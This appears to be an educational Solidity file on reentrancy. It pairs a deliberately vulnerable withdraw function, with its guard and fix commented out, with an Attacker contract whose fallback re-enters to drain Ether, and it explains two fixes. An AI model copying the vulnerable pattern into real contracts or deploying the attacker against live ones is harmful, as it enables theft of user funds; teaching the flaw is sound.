pragma solidity ^0.6.10;

/*
  If a contract A can call into contract B, while B is still executing the previous call, it can be exploited.
  In the following example, B has a balance, part of the total of entire value of contract A. It should only
  be possible to withdraw its share for B, but due to the exploit B can make recurring withdrawing calls, without
  A realizing it has allready been called. 
  
  Preventing re-entrancy:
  - #1. change state variable with available funds before sending the payout
  - #2  implement a re-entracy guard by locking the contract 
*/

contract VulnerableContract{
  mapping(address => uint) public balances;

  function deposit() public payable {
    balances[msg.sender] += msg.value;
  }
  
  //////////////////////////////////////////////////////////////////
  // #2 Lock contract while processing withdrawal request
  bool internal locked;
  modifier noReentrant(){
      require(!locked, "No re-entrancy");
      locked = true;
      _;
      locked = false;
  }
  //////////////////////////////////////////////////////////////////

  function withdraw(uint _amount) public /* noReentrant*/ {
    require(balances[msg.sender] >= _amount, "insuficient funds");
    
    // #1 balances[msg.sender] -= amount;
    
    (bool sent, ) = msg.sender.call{value: _amount}("");
    require(sent, "Failed to send Ether");

    balances[msg.sender] -= _amount;
  }

  function getBalance() public view returns (uint){
    return address(this).balance;
  }
}

contract Attacker{
  VulnerableContract public vulnerableContract;

  constructor(address _vulnerableContractAddress) public {
    vulnerableContract = VulnerableContract(_vulnerableContractAddress);
  }

  fallback() external payable {
    if(address(vulnerableContract).balance >= 1 ether){
      vulnerableContract.withdraw(1 ether);
    }
  }

  function attack() external payable {
    require(msg.value >= 1 ether);
    vulnerableContract.deposit{value: 1 ether}();
    vulnerableContract.withdraw(1 ether); // triggers the fallback function
  }

  function getBalance() public view returns (uint){
    return address(this).balance;
  }
}

// source: https://www.youtube.com/watch?v=4Mm3BCyHtDY&list=PLO5VPQH6OWdWsCgXJT9UuzgbC8SPvTRi5
